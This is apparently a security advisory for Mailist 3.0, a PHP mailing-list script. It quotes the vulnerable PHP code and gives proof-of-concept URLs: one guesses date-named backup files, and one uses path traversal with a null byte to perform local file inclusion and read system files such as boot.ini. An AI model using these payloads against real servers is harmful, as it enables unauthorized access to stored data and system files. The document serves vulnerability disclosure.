Mailist 3.0 Insecure Backup/Local File Inclusion Vulnerabilities
================================================================



#############################################################################################

[+] Homepage : http://ninjadesigns.co.uk/

[+] Download : http://ninjadesigns.co.uk/enter/mailist.zip


[+] Insecure Backup

 - Vulnerable code in admin.php


---------------------------------------------------------------------


if (isset($_GET[&#039;backup&#039;])){
	echo "<br>";
	$file = &#039;maillist.php&#039;;
	$newfile = &#039;backups/&#039;.date("jnY").&#039;.txt&#039;;
	copy($file, $newfile);
	echo &#039;Successfully backed up. (backups/&#039;.$newfile.&#039;)<br>&#039;;
	echo &#039;<a href="&#039;.$_SERVER[&#039;PHP_SELF&#039;].&#039;">Hide</a><br>&#039;;
}


----------------------------------------------------------------------

 We can see how its crated a backup : $newfile = &#039;backups/&#039;.date("jnY").&#039;.txt&#039;;
 The date() function is used.

    j -	Day of the month without leading zeros

 So we can guess the database backup if we know when was created.

   Example : 622009.txt

        6 - the day without leading 0
        2 - the month without leading 0
        2009 - the year

   PoC :  http://127.0.0.1/path/backups/622009.txt



[+] Local File Inclusion


 - Vulnerable code in send.php :

---------------------------------------------------------------------

if(isset($load)){

include("outbox/".$load.".txt");
}


---------------------------------------------------------------------

 Example :

   http://127.0.0.1/path/send.php?load=[Local File]%00

 PoC :

    http://127.0.0.1/path/send.php?load=../../../../boot.ini%00



#############################################################################################




